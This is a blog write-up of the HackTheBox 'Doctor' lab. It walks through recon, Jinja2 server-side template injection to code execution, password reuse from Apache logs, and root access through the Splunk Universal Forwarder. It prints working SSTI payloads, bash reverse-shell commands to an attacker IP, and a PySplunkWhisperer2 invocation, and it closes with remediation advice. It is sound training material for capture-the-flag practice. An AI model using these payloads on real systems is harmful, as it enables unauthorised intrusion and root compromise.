---
toc: true
comments: true
title: HackTheBox - Doctor
layout: post
title: HackTheBox - Doctor
date: 2024-06-30 18:28 -0300
categories: [HackTheBox, Easy, CTF]
tags: [Linux, SSTI, Flask, Jinja2, Splunk, Password Reuse, PrivEsc]    
image: /assets/Posts/Doctor/logo.png
---

## Pre
- Doctor is the box that made **SSTI** (Server-Side Template Injection) click for me. A Flask app renders a user-supplied string through Jinja2 without escaping, and that single mistake turns "print my name" into "run my commands".
- The escalation introduces **Splunk** abuse via the Universal Forwarder – a technique you'll meet in real corporate networks far more than in CTFs.
- This is the injection-heavy sibling of [Jarvis](/posts/hackthebox-jarvis/); if SQLi there felt good, SSTI here is the same "user input reaches a dangerous interpreter" idea in a different language.

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
8089/tcp open  http    syn-ack
```

```shell
$ nmap -Pn -n -p 22,80,8089 -T4 -sSCV -A -oN nmap/versions $IP
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
|_http-server-header: Splunkd
```

Port **8089** is `Splunkd` – file that away, it's almost certainly the privesc. The website on 80 is a hospital landing page. In its contact section there's an email domain: `info@doctors.htb`. That's a vhost hint, so we add it:

```shell
$ echo "10.10.10.209 doctors.htb" | sudo tee -a /etc/hosts
```

Browsing `http://doctors.htb` gives a completely different app: a **Flask-based** messaging portal with register/login.

## Phase 2: Finding the SSTI
We register an account and explore. The app lets us post messages with a **title** and body. Poking at the page source, there's a hidden `/archive` endpoint that renders posts into an RSS-style feed – and it reflects the post **title**.

Anywhere a framework renders our input back to us, we test for template injection with a math probe:

{% raw %}
```
Title: {{7*7}}
```
{% endraw %}

Load `/archive` and view source – if it shows `49`, the title is being evaluated as a Jinja2 template. It does. That's SSTI confirmed.

> The `{% raw %}{{7*7}}{% endraw %}` → `49` test is the universal "is this a template engine?" probe. If you instead see `{% raw %}{{7*7}}{% endraw %}` echoed literally, it's not SSTI (maybe XSS). If you see `49`, keep going toward RCE.
{: .prompt-tip }

## Phase 3: SSTI to RCE
Jinja2 SSTI escalates to code execution by walking Python's object model until we reach the `os` module. A reliable payload:

{% raw %}
```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```
{% endraw %}

Posting that as a title and refreshing `/archive` returns `uid=1001(web)`. Now we swap `id` for a reverse shell (URL-encoded to survive transport):

{% raw %}
```python
{{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"').read() }}
```
{% endraw %}

With `nc -lvnp 4444` waiting, we catch a shell as **web** and stabilise it.

## Phase 4: Password reuse → shaun
`web` can't read the user flag (that belongs to `shaun`). Time to hunt for secrets in places a low-priv user can read. Apache logs are a classic:

```shell
web@doctor:/$ grep -iR "password" /var/log/apache2/ 2>/dev/null
GET /reset_password?email=Guitar123 HTTP/1.1
```

Someone typed a password into a URL that got logged (a real, embarrassingly common mistake). We try `Guitar123` against the local users – it's reused for **shaun**:

```shell
web@doctor:/$ su shaun
Password: Guitar123
shaun@doctor:~$ cat user.txt
```

## Phase 5: Splunk Universal Forwarder → root
Back to that port 8089 Splunk service. Splunk's **Universal Forwarder** can be told, by an authenticated user, to run scripts on the host – and here it runs them as **root**. The tool [PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2) automates exactly this: it packages a payload as a Splunk app and pushes it through the forwarder's management endpoint.

```shell
$ python3 PySplunkWhisperer2_remote.py \
    --host 10.10.10.209 --port 8089 \
    --username shaun --password Guitar123 --lhost 10.10.14.7 \
    --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.7/5555 0>&1'"
```

The forwarder executes our payload as root, and our second listener catches the root shell:

```shell
$ nc -lvnp 5555
root@doctor:/# id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusions
- Doctor is a clean two-part lesson: SSTI (input → Jinja2 → Python objects → `os`), then a real-world Splunk Universal Forwarder abuse.
- Two habits pay off: probe *every* reflection point with `{% raw %}{{7*7}}{% endraw %}`, and always `grep` logs for leaked passwords when you're stuck between users.
- Fixes: never render user input as a template (use autoescaping and pass data as context variables), and lock down Splunk forwarder management with authentication + `disableDefaultPort`.
- Next is one of my favourites: Jenkins, KeePass and pass-the-hash on [Jeeves](/posts/hackthebox-jeeves/).

_Keep hacking_  🙈🙉🙊
